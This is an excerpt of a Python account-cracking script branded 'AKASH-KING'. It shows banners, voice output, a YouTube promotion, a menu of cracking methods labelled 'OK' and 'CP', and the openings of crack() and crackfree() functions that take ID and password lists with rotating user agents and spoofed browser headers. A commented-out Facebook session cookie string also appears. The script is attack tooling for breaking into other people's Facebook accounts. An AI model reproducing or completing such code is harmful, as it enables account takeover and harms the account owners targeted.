...
os.system('espeak -a 300 " Update, Version, New"')
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mUpdate Version NEW😎...? ')
os.system('espeak -a 300 " Tools, Is, Free, User, And, Paid,Allow"')
os.system('espeak -a 300 " AKASH, Boss, Is, Always, King, Ok, Bro..."')
time.sleep(5)
os.system('clear')
os.system('espeak -a 600 " Subscribe, My, Youtube, Channel"')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mSUBSCRIBE MY YOUTUBE CHANNEL")
time.sleep(2)
os.system(f'xdg-open https://youtube.com/@akash_annie_100k?si=whfuH1_hnUl09aWK/')
#------------------[ AKASH ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mAKASH-KING]    \33[1;38m║\033[1;31m 
╠══[Facebook                 • AKASH-KING     ║  \033[1;97m  
╠══[Github                   • \33[1;38mAKASH-KING     ║\33[1;34m   
╠══[Whatsapp                 • 017******77 ]  ║\33[1;35m 
╠══[TOOLS                    • FREE ]         ║ \33[1;32m   
╠══[VERSION                  • NEW ]          ║\033[1;35m
╠══[ADREES                   • DHAKA          ║\33[1;38m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m """
os.system('clear')
print(logo)
...
def setting():
    ...
    print('\033[0;91m==================')
    print('\033[0;91m==================')
    print("\033[97;1m[\033[92;1m1\033[97;1m] METHOD 1 [\033[0;92mCOOKES SHOW \033[0;91mCP  ID Not Show\033[1;37m]")
    print("\033[97;1m[\033[92;1m2\033[97;1m] METHOD 2 [\033[0;93mCp id Show\033[1;37mShow Only CpId \033[1;37m]")
    print('\033[0;91m==================')
    hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
    #os.system("xdg-open https://www.facebook.com/bcwakashff?mibextid=ZbWKwL.Ok.Bro")
    if hc in ['1','01']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[AKASH•ON]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    # 'cookie': 'datr=DskjZS-3IH3Ov9gfFbvHlcKy; sb=DskjZTDa6FJYSVlAfC2BYUv1; locale=en_GB; vpd=v1%3B895x450x1.600000023841858; m_pixel_ratio=1.600000023841858; wd=450x895; fr=06e32kGmRpeFsgkNd.AWVVCJAJNDW_5q-Gh1VV6mPBloM.BlI8kO.HZ.AAA.0.0.BlJAJB.AWV3rbFoKAc',
    'dpr': '1.600000023841858',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"V2102"',
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[AKASH-ON]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
